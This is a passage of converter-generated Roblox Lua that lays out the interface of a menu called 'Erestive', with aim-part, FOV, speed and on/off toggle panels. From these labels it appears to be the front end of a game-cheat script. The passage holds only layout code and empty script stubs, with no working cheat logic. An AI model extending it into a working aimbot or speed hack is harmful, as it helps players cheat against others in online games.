G2L["460"]["PaddingLeft"] = UDim.new(0, 1);
G2L["460"]["PaddingBottom"] = UDim.new(0, 1);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.UIGridLayout
G2L["461"] = Instance.new("UIGridLayout", G2L["45f"]);
G2L["461"]["CellSize"] = UDim2.new(0, 145, 0, 40);
G2L["461"]["CellPadding"] = UDim2.new(0, 9, 0, 20);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart
G2L["462"] = Instance.new("Frame", G2L["45f"]);
G2L["462"]["Visible"] = false;
G2L["462"]["BorderSizePixel"] = 0;
G2L["462"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["462"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["462"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["462"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["462"]["Name"] = [[aimpart]];
G2L["462"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.UIListLayout
G2L["463"] = Instance.new("UIListLayout", G2L["462"]);
G2L["463"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV
G2L["464"] = Instance.new("Frame", G2L["462"]);
G2L["464"]["BorderSizePixel"] = 0;
G2L["464"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["464"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["464"]["Position"] = UDim2.new(-0.07586, 0, 0, 0);
G2L["464"]["Name"] = [[FOV]];
G2L["464"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.UICorner
G2L["465"] = Instance.new("UICorner", G2L["464"]);
G2L["465"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.FOVConfig
G2L["466"] = Instance.new("Frame", G2L["464"]);
G2L["466"]["BorderSizePixel"] = 0;
G2L["466"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["466"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["466"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["466"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.FOVConfig.UICorner
G2L["467"] = Instance.new("UICorner", G2L["466"]);
G2L["467"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.FOVConfig.UIListLayout
G2L["468"] = Instance.new("UIListLayout", G2L["466"]);
G2L["468"]["Padding"] = UDim.new(0, 10);
G2L["468"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.FOVConfig.TextButton
G2L["469"] = Instance.new("TextButton", G2L["466"]);
G2L["469"]["TextWrapped"] = true;
G2L["469"]["BorderSizePixel"] = 0;
G2L["469"]["TextSize"] = 14;
G2L["469"]["TextScaled"] = true;
G2L["469"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["469"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["469"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["469"]["BackgroundTransparency"] = 1;
G2L["469"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["469"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["469"]["Text"] = [[Head]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.FOVConfig.TextButton.LocalScript
G2L["46a"] = Instance.new("LocalScript", G2L["469"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.UIGradient
G2L["46b"] = Instance.new("UIGradient", G2L["464"]);
G2L["46b"]["Rotation"] = -90;
G2L["46b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.ImageLabel
G2L["46c"] = Instance.new("ImageLabel", G2L["464"]);
G2L["46c"]["BorderSizePixel"] = 0;
G2L["46c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["46c"]["Image"] = [[rbxassetid://7992557358]];
G2L["46c"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["46c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46c"]["BackgroundTransparency"] = 1;
G2L["46c"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.WhiteBar
G2L["46d"] = Instance.new("Frame", G2L["464"]);
G2L["46d"]["Visible"] = false;
G2L["46d"]["BorderSizePixel"] = 0;
G2L["46d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46d"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["46d"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["46d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["46d"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.WhiteBar.UIGradient
G2L["46e"] = Instance.new("UIGradient", G2L["46d"]);
G2L["46e"]["Rotation"] = 90;
G2L["46e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.aimpart.FOV.UIStroke
G2L["46f"] = Instance.new("UIStroke", G2L["464"]);
G2L["46f"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed
G2L["470"] = Instance.new("Frame", G2L["45f"]);
G2L["470"]["Visible"] = false;
G2L["470"]["BorderSizePixel"] = 0;
G2L["470"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["470"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["470"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["470"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["470"]["Name"] = [[Speed]];
G2L["470"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.UIListLayout
G2L["471"] = Instance.new("UIListLayout", G2L["470"]);
G2L["471"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV
G2L["472"] = Instance.new("Frame", G2L["470"]);
G2L["472"]["BorderSizePixel"] = 0;
G2L["472"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["472"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["472"]["Name"] = [[FOV]];
G2L["472"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.UICorner
G2L["473"] = Instance.new("UICorner", G2L["472"]);
G2L["473"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig
G2L["474"] = Instance.new("Frame", G2L["472"]);
G2L["474"]["BorderSizePixel"] = 0;
G2L["474"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["474"]["Size"] = UDim2.new(0.57695, 0, 0.81331, 0);
G2L["474"]["Position"] = UDim2.new(0.39591, 0, 0.09064, 0);
G2L["474"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.UICorner
G2L["475"] = Instance.new("UICorner", G2L["474"]);
G2L["475"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.FOVSet
G2L["476"] = Instance.new("TextBox", G2L["474"]);
G2L["476"]["Visible"] = false;
G2L["476"]["Name"] = [[FOVSet]];
G2L["476"]["PlaceholderColor3"] = Color3.fromRGB(90, 169, 157);
G2L["476"]["TextWrapped"] = true;
G2L["476"]["TextSize"] = 14;
G2L["476"]["TextColor3"] = Color3.fromRGB(71, 255, 38);
G2L["476"]["TextScaled"] = true;
G2L["476"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["476"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["476"]["ClearTextOnFocus"] = false;
G2L["476"]["PlaceholderText"] = [[Dis]];
G2L["476"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["476"]["Position"] = UDim2.new(0.54158, 0, 0, 0);
G2L["476"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["476"]["Text"] = [[100]];
G2L["476"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.FOVSet.LocalScript
G2L["477"] = Instance.new("LocalScript", G2L["476"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV
G2L["478"] = Instance.new("Frame", G2L["474"]);
G2L["478"]["Visible"] = false;
G2L["478"]["ZIndex"] = 2;
G2L["478"]["BorderSizePixel"] = 0;
G2L["478"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["478"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["478"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["478"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["478"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Animations
G2L["479"] = Instance.new("LocalScript", G2L["478"]);
G2L["479"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["47a"] = Instance.new("ImageLabel", G2L["479"]);
G2L["47a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47a"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["47a"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["47a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["47a"]["BackgroundTransparency"] = 1;
G2L["47a"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.UICorner
G2L["47b"] = Instance.new("UICorner", G2L["478"]);
G2L["47b"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Button
G2L["47c"] = Instance.new("TextButton", G2L["478"]);
G2L["47c"]["TextWrapped"] = true;
G2L["47c"]["TextSize"] = 14;
G2L["47c"]["TextScaled"] = true;
G2L["47c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["47c"]["BackgroundTransparency"] = 1;
G2L["47c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["47c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["47c"]["Text"] = [[ ]];
G2L["47c"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Button.Animations
G2L["47d"] = Instance.new("LocalScript", G2L["47c"]);
G2L["47d"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Button.Loca1
G2L["47e"] = Instance.new("LocalScript", G2L["47c"]);
G2L["47e"]["Enabled"] = false;
G2L["47e"]["Name"] = [[Loca1]];
G2L["47e"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Button.Loca2
G2L["47f"] = Instance.new("LocalScript", G2L["47c"]);
G2L["47f"]["Enabled"] = false;
G2L["47f"]["Name"] = [[Loca2]];
G2L["47f"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Button.Loca3
G2L["480"] = Instance.new("LocalScript", G2L["47c"]);
G2L["480"]["Enabled"] = false;
G2L["480"]["Name"] = [[Loca3]];
G2L["480"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.Text
G2L["481"] = Instance.new("TextLabel", G2L["478"]);
G2L["481"]["TextWrapped"] = true;
G2L["481"]["ZIndex"] = 9;
G2L["481"]["TextSize"] = 14;
G2L["481"]["TextScaled"] = true;
G2L["481"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["481"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["481"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["481"]["BackgroundTransparency"] = 1;
G2L["481"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["481"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["481"]["Text"] = [[Set Speed]];
G2L["481"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.SetFOV.UIGradient
G2L["482"] = Instance.new("UIGradient", G2L["478"]);
G2L["482"]["Rotation"] = -90;
G2L["482"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.FOVSet2
G2L["483"] = Instance.new("TextBox", G2L["474"]);
G2L["483"]["Visible"] = false;
G2L["483"]["Name"] = [[FOVSet2]];
G2L["483"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["483"]["TextWrapped"] = true;
G2L["483"]["TextSize"] = 14;
G2L["483"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["483"]["TextScaled"] = true;
G2L["483"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["483"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["483"]["ClearTextOnFocus"] = false;
G2L["483"]["PlaceholderText"] = [[Speed]];
G2L["483"]["Size"] = UDim2.new(0, 33, 0, 33);
G2L["483"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["483"]["Text"] = [[0.1]];
G2L["483"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.UIListLayout
G2L["484"] = Instance.new("UIListLayout", G2L["474"]);
G2L["484"]["Padding"] = UDim.new(0, 10);
G2L["484"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.TextButton
G2L["485"] = Instance.new("TextButton", G2L["474"]);
G2L["485"]["TextWrapped"] = true;
G2L["485"]["BorderSizePixel"] = 0;
G2L["485"]["TextSize"] = 14;
G2L["485"]["TextScaled"] = true;
G2L["485"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["485"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["485"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["485"]["BackgroundTransparency"] = 1;
G2L["485"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["485"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["485"]["Text"] = [[Legit1]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.FOVConfig.TextButton.LocalScript
G2L["486"] = Instance.new("LocalScript", G2L["485"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.UIGradient
G2L["487"] = Instance.new("UIGradient", G2L["472"]);
G2L["487"]["Rotation"] = -90;
G2L["487"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.ImageLabel
G2L["488"] = Instance.new("ImageLabel", G2L["472"]);
G2L["488"]["BorderSizePixel"] = 0;
G2L["488"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["488"]["Image"] = [[rbxassetid://87867532553953]];
G2L["488"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["488"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["488"]["BackgroundTransparency"] = 1;
G2L["488"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.WhiteBar
G2L["489"] = Instance.new("Frame", G2L["472"]);
G2L["489"]["Visible"] = false;
G2L["489"]["BorderSizePixel"] = 0;
G2L["489"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["489"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["489"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["489"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["489"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.WhiteBar.UIGradient
G2L["48a"] = Instance.new("UIGradient", G2L["489"]);
G2L["48a"]["Rotation"] = 90;
G2L["48a"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.UIStroke
G2L["48b"] = Instance.new("UIStroke", G2L["472"]);
G2L["48b"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.Speed.FOV.UIGradient
G2L["48c"] = Instance.new("UIGradient", G2L["472"]);
G2L["48c"]["Rotation"] = -90;
G2L["48c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF
G2L["48d"] = Instance.new("Frame", G2L["45f"]);
G2L["48d"]["Visible"] = false;
G2L["48d"]["BorderSizePixel"] = 0;
G2L["48d"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["48d"]["Size"] = UDim2.new(0.96172, 0, 0.07267, 0);
G2L["48d"]["Position"] = UDim2.new(-0, 0, 0.23306, 0);
G2L["48d"]["Name"] = [[ONOFF]];
G2L["48d"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.WhiteBar
G2L["48e"] = Instance.new("Frame", G2L["48d"]);
G2L["48e"]["BorderSizePixel"] = 0;
G2L["48e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48e"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["48e"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["48e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["48e"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.WhiteBar.UIGradient
G2L["48f"] = Instance.new("UIGradient", G2L["48e"]);
G2L["48f"]["Rotation"] = 90;
G2L["48f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider
G2L["490"] = Instance.new("Frame", G2L["48d"]);
G2L["490"]["BorderSizePixel"] = 0;
G2L["490"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["490"]["Size"] = UDim2.new(0.16373, 0, 0.731, 0);
G2L["490"]["Position"] = UDim2.new(0.80655, 0, 0.11724, 0);
G2L["490"]["Name"] = [[Slider]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Animations
G2L["491"] = Instance.new("LocalScript", G2L["490"]);
G2L["491"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Animations.Sample
G2L["492"] = Instance.new("ImageLabel", G2L["491"]);
G2L["492"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["492"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["492"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["492"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["492"]["BackgroundTransparency"] = 1;
G2L["492"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.UICorner
G2L["493"] = Instance.new("UICorner", G2L["490"]);
G2L["493"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.UIGradient
G2L["494"] = Instance.new("UIGradient", G2L["490"]);
G2L["494"]["Rotation"] = -90;
G2L["494"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Button
G2L["495"] = Instance.new("TextButton", G2L["490"]);
G2L["495"]["TextSize"] = 14;
G2L["495"]["TextColor3"] = Color3.fromRGB(55, 0, 0);
G2L["495"]["BackgroundColor3"] = Color3.fromRGB(55, 0, 0);
G2L["495"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["495"]["ZIndex"] = 2;
G2L["495"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["495"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["495"]["Text"] = [[ ]];
G2L["495"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Button.LocalScript
G2L["496"] = Instance.new("LocalScript", G2L["495"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.Slider.Button.UICorner
G2L["497"] = Instance.new("UICorner", G2L["495"]);
G2L["497"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.OnOrOff
G2L["498"] = Instance.new("TextLabel", G2L["48d"]);
G2L["498"]["TextWrapped"] = true;
G2L["498"]["ZIndex"] = 2;
G2L["498"]["TextSize"] = 14;
G2L["498"]["TextScaled"] = true;
G2L["498"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["498"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["498"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["498"]["BackgroundTransparency"] = 1;
G2L["498"]["Size"] = UDim2.new(0.20788, 0, 0.5158, 0);
G2L["498"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["498"]["Text"] = [[Off]];
G2L["498"]["Name"] = [[OnOrOff]];
G2L["498"]["Position"] = UDim2.new(0.40774, 0, 0.2225, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.UICorner
G2L["499"] = Instance.new("UICorner", G2L["48d"]);
G2L["499"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.UIGradient
G2L["49a"] = Instance.new("UIGradient", G2L["48d"]);
G2L["49a"]["Rotation"] = -90;
G2L["49a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.ImageLabel
G2L["49b"] = Instance.new("ImageLabel", G2L["48d"]);
G2L["49b"]["BorderSizePixel"] = 0;
G2L["49b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["49b"]["Image"] = [[rbxassetid://15011030819]];
G2L["49b"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["49b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49b"]["BackgroundTransparency"] = 1;
G2L["49b"]["Position"] = UDim2.new(0.07602, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame7.ONOFF.UIStroke
G2L["49c"] = Instance.new("UIStroke", G2L["48d"]);
G2L["49c"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.NavFrame
G2L["49d"] = Instance.new("Frame", G2L["a5"]);
G2L["49d"]["BorderSizePixel"] = 0;
G2L["49d"]["BackgroundColor3"] = Color3.fromRGB(16, 17, 24);
G2L["49d"]["Size"] = UDim2.new(0.25, 0, 1, 0);
G2L["49d"]["Name"] = [[NavFrame]];
G2L["49d"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame
G2L["49e"] = Instance.new("ScrollingFrame", G2L["49d"]);
G2L["49e"]["Active"] = true;
G2L["49e"]["BorderSizePixel"] = 0;
G2L["49e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49e"]["Name"] = [[2ScrollingFrame]];
G2L["49e"]["ScrollBarImageTransparency"] = 1;
G2L["49e"]["AutomaticCanvasSize"] = Enum.AutomaticSize.X;
G2L["49e"]["Size"] = UDim2.new(1, 0, 0.85448, 0);
G2L["49e"]["ScrollBarImageColor3"] = Color3.fromRGB(16, 17, 24);
G2L["49e"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["49e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49e"]["ScrollBarThickness"] = 0;
G2L["49e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.LocalScript
G2L["49f"] = Instance.new("LocalScript", G2L["49e"]);



-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.UIListLayout
G2L["4a0"] = Instance.new("UIListLayout", G2L["49e"]);
G2L["4a0"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["4a0"]["Padding"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.UIPadding
G2L["4a1"] = Instance.new("UIPadding", G2L["49e"]);
G2L["4a1"]["PaddingTop"] = UDim.new(0.012, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.UICorner
G2L["4a2"] = Instance.new("UICorner", G2L["49e"]);
G2L["4a2"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame
G2L["4a3"] = Instance.new("TextButton", G2L["49e"]);
G2L["4a3"]["BorderSizePixel"] = 0;
G2L["4a3"]["TextSize"] = 16;
G2L["4a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a3"]["BackgroundColor3"] = Color3.fromRGB(45, 49, 55);
G2L["4a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4a3"]["BackgroundTransparency"] = 1;
G2L["4a3"]["Size"] = UDim2.new(0.9, 0, 0.05314, 0);
G2L["4a3"]["Text"] = [[]];
G2L["4a3"]["Name"] = [[1Frame]];
G2L["4a3"]["Position"] = UDim2.new(0.05, 0, 0.04147, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.LocalScript
G2L["4a4"] = Instance.new("LocalScript", G2L["4a3"]);



-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.UICorner
G2L["4a5"] = Instance.new("UICorner", G2L["4a3"]);
G2L["4a5"]["CornerRadius"] = UDim.new(0, 4);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.1Frame.UIStroke
